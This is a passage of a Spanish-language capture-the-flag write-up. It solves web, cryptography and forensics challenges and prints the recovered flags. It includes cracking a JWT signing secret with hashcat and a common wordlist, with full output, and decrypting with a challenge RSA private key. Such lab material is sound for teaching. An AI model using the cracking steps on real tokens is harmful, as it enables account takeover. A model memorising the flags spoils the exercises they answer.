class=&#34;p&#34;&gt;;};&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;callme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4b81bb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;E^eq&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x56ae&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;X!jV&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b81bb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Ejecuta la funcion callme().&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;w07&#34;&gt;w.07&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Key bruteforce o adivina ;).&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sckull@uplifted:~/tmp/web$ php w.07.php &#39;key=1337&#39;
Key entered: 1337
CipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0=
PlainText:  
sckull@uplifted:~/tmp/web$ php w.07.php &#39;key=1338&#39;
Key entered: 1338
CipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0=
PlainText: FLAG{4_l1ttl3_b4t_h4rd3r} 
sckull@uplifted:~/tmp/web$
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;w08&#34;&gt;w.08&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiRkxBR3tqd3RfdDBrM25zX2FyM19jMDBsX2IzNG56fSJ9.gNVX4fCIMvjLYZ0jUY0untMYbPmRNNFzZwXyU01bv-M
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://jwt.io/&#34;&gt;&lt;strong&gt;Json Web Token&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2002.05.59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;w09&#34;&gt;w.09&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2002.06.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0#756c17ca05dbc57b9ded6541055370059c145e3b31521c0c98df2b1674725601
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Utilizamos hashcat&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sckull@uplifted:~/tmp/web$ /home/sckull/tools/hashcat/hashcat64.bin -m 16500 09web_jwt.txt /home/sckull/tools/rockyou.txt -o 09web_output.txt
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause &amp;quot;CL_OUT_OF_RESOURCES&amp;quot; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: /home/sckull/tools/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: JWT (JSON Web Token)
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNy...nRyVgE
Time.Started.....: Mon Mar 16 02:21:40 2020 (0 secs)
Time.Estimated...: Mon Mar 16 02:21:40 2020 (0 secs)
Guess.Base.......: File (/home/sckull/tools/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6400.2 kH/s (8.23ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 98304/14344385 (0.69%)
Rejected.........: 0/98304 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -&amp;gt; Donovan
Hardware.Mon.#1..: Temp: 60c Util: 47% Core:1189MHz Mem:2505MHz Bus:4

Started: Mon Mar 16 02:21:29 2020
Stopped: Mon Mar 16 02:21:42 2020
sckull@uplifted:~/tmp/web$ cat 09web_output.txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0.dWwXygXbxXud7WVBBVNwBZwUXjsxUhwMmN8rFnRyVgE:rockyou
sckull@uplifted:~/tmp/web$ 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;w10&#34;&gt;w.10&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;La clave esta en el codigo fuente &lt;code&gt;$key = hash( &#39;sha256&#39;, str(0x22C49FE9));&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sckull@uplifted:~/tmp/web$ python
Python 2.7.17 (default, Nov  7 2019, 10:07:09) 
[GCC 7.4.0] on linux2
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; print 0x22C49FE9
583311337
&amp;gt;&amp;gt;&amp;gt; 
sckull@uplifted:~/tmp/web$ php w.10.php &#39;key=583311337&#39;
Key entered: 583311337
CipherText: OWVzUHhVVFNsM0t6NFhDb1FiT0RJaHNrWWYrM3VRMi9FNXcyTGhxbVV0aHpKUjdOcGRVcWtZcWc3djV5OFVxQw==
PlainText: FLAG{1_h0p3_y0u_d1dnt_brut3f0rc3_m3...LINE_16} 

sckull@uplifted:~/tmp/web$
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;cryptography&#34;&gt;Cryptography&lt;/h1&gt;
&lt;h2 id=&#34;c01&#34;&gt;c.01&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;RkxBR3sxc3RfdGltZV9sdWNreX0=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Base64&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/crypto$ cat c.01
&lt;span class=&#34;nv&#34;&gt;RkxBR3sxc3RfdGltZV9sdWNreX0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
sckull@uplifted:~/tmp/crypto$ cat c.01&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64 -d
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;1st_time_lucky&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
sckull@uplifted:~/tmp/crypto$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;c02&#34;&gt;c.02&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;VW10NFFsSXpjM3BqYlZKbVpFZHNkRnBZVG1aWlZqbHFZVWRHZVdKWU1EMD0=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Base64 X3&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;https://gchq.github.io/CyberChef/#recipe&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;From_Base64&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A-Za-z0-9%2B/%3D&amp;#39;&lt;/span&gt;,true&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;From_Base64&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A-Za-z0-9%2B/%3D&amp;#39;&lt;/span&gt;,true&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;From_Base64&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A-Za-z0-9%2B/%3D&amp;#39;&lt;/span&gt;,true&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;VlcxME5GRnNTWHBqTTNCcVlsWktiVnBGWkhOa1JuQlpWRzFhV2xacWJIRlpWV1JIWlZkS1dVMUVNRDA9
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;c03&#34;&gt;c.03&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SYNT{fgnoorq_va_gur_onpx}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;ROT13&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;amp;input=U1lOVHtmZ25vb3JxX3ZhX2d1cl9vbnB4fQ
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;c04&#34;&gt;c.04&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;F5yd29CuXST7e5aMKaX4bnkV8xF8dKSMB7E14yWUU
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Base58&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,false)&amp;amp;input=RjV5ZDI5Q3VYU1Q3ZTVhTUthWDRibmtWOHhGOGRLU01CN0UxNHlXVVU
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;c05&#34;&gt;c.05&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\HWPG^DCXETEHAT^WT_RCHAEX^_XBI^CX_V;XEBEYTSTBE;B^BTRDCT;;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;1- XOR BruteForce (Key: 31)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2- XOR&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,&#39;Standard&#39;,false,true,false,&#39;&#39;/disabled)XOR(%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;31&#39;%7D,&#39;Standard&#39;,false)&amp;amp;input=XEgRV1BHXkRDWEVUEUVIQVQRXlcRVF9SQ0hBRVheXxFYQhFJXkNYX1Y7WEUWQhFFWVQRU1RCRTsSQl4RQlRSRENUOzt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTA
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;c06&#34;&gt;c.06&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Mlw Obkwgxvw vbtzxk mk t filahh gy xrukrtlbgk seilsuxxav mipm uc mlbry t lijbxw gy brlxkagoxr Utxwsk vmhaxvk, utwww hr lax pwmmijl hj s dxcohkh. Am xqhehck t ysjf hj hhecseilsuxxav lytlmmlnmmgg.

Ymjlm hwlvvauxh tr Zmgotr Ttmxalme Txepslh mf 1553, mai ubilwk bw wtlc lh nrvxkwltgh sgw meieiexgx, tnm ml kxwalmiv tep smmieimw lh uvwtd ml ngxae 1863, mljxx gwgmyjbxw dtmij. Mamk xtvfxw ml mai vxlgjbixahg pw vamxyki agwiuabjxktfdx (Yvwgvl xhk &#39;xzx brvxvmhaxvsuei ubilwk&#39;). Fefr iigiei ztoi lkbiv mh meieiexgx wgvvqimmgg lgzxfik mael tki wllifmbeder Zazxrwkx gaiaijl. Br 1863, Xkbivkbgz Dtwaldm otl xzx ymjlm xg infdbll s zxrwktp exmlgw hj vxvmhaxvagz Zazxrwkx gaiaijl.

Br lax 19xz vxrlnkc lax wuaxqw ptw eblelmkmtnmiv mh Fdtbww wx Zazxrwkx (1523–1596), efw ls svjyakxh aml tjxlifm geex.

Rsmk ypsz bw txeso:

YEEY{vasuheelx_xgdtbvw}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Vigenere-cipher&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2001.48.38.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;c07&#34;&gt;c.07&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
MIIBOQIBAAJBALWyVLY0Yum5/589v9ECnrHDzDu1AyDP38Ajx6tcul9G2cFUFUMY
Iqf9Wm8BFxNxErdOWmhlJaw+q8rbaAyyRvUCAwEAAQJAWEYrodoRtDwJVPRLHOCI
+RSHRPrMakSUEGVRvI9wfJi654A0HYLyk8JZnf+CbeueI7KnN/2w4MPIkxK9Mjfk
gQIhAP878FR1Yo1X508REZ1YNVDKc6pl33Fm32LVSbz5s/RzAiEAtj3nQwJEgVG4
Bv2CIBZ1CRIGmILeZY3Cx54hGnB55PcCIGy/CgfCN+pHALvUZu/mTFkO2TdJzmkP
zq/adl94+K53AiAZ5PHXM5tIRLRBSgQTSx2WDFmjkfTHuTzT4EQT3ad0QQIgUPy3
p9QrcqBWnnHkTM+MjIjpRzQ2TMLx1e6dOxgYDl4=
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;openssl enc -in c.07.txt -out binarytext -d -a &amp;amp;&amp;amp; openssl rsautl -decrypt -in binarytext -out flag07.txt -inkey c.07.key &amp;amp;&amp;amp; cat flag07.txt&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;c08&#34;&gt;c.08&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hint: bacon

loloooolooololoololoooollollololloooolooloolooolllooloooololololoooooooollooloooloooloooolooooooooloollololloooooooollooooollooloooollooolloloooloooooollooooollloloooloooooolooolll
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/bacon-cipher&#34;&gt;&lt;strong&gt;Bacon Cipher&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2001.50.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;c09&#34;&gt;c.09&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WOPM PM ZG ZDJOZEYWPR MXEMWPWXWPHG RPJOYL VOYLY YZRO DYWWYL PM LYJDZRYT VPWO ZGHWOYL. WOY ZDJOZEYW PM ZERTYUIOPQSDFGHJKLMWXCVBNA. NHXL UDZI PM UDZI{YZMN_ZM_ZER_123}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;1-&lt;/strong&gt; &lt;a href=&#34;https://www.guballa.de/substitution-solver&#34;&gt;&lt;strong&gt;Monoalphabetic Substitution&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2- CyberChef - Monoalphabetic Substitution&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=Substitute(&#39;PLAYFM&#39;,&#39;FLAGYB&#39;)&amp;amp;input=VEhJUyBJUyBBTiBBTERIQU1FVElDIFNVTVNUSVRVVElPTiBDSURIRVIgV0hFUkUgRUFDSCBMRVRURVIgSVMgUkVETEFDRUcgV0lUSCBBTk9USEVSLiBUSEUgQUxESEFNRVQgSVMgQU1DR0VQWUhJVlpMS05PREpSU1RVQldRRlguIEZPVVIgUExBWSBJUyBQTEFZe0VBU0ZfQVNfQU1DXzEyM30
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;FLAG{easy_as_abc_123}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;c10&#34;&gt;c.10&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;333 555 2 4 7 777 33 2 66 3 777 666 444 3 2 66 3 444 666 7777
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/multitap-abc-cipher&#34;&gt;&lt;strong&gt;Multitap abc Cipher&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-16%2001.55.18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;forensics&#34;&gt;Forensics&lt;/h1&gt;
&lt;h2 id=&#34;f01&#34;&gt;f.01&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ cat f.01&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep FLAG
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;here_i_am&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
sckull@uplifted:~/tmp/forensics$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f02wav&#34;&gt;f.02.wav&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://morsecode.world/international/decoder/audio-decoder-adaptive.html&#34;&gt;&lt;strong&gt;Morse - Decoder Audio&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;MORSE **** ***&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f03jpg&#34;&gt;f.03.jpg&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
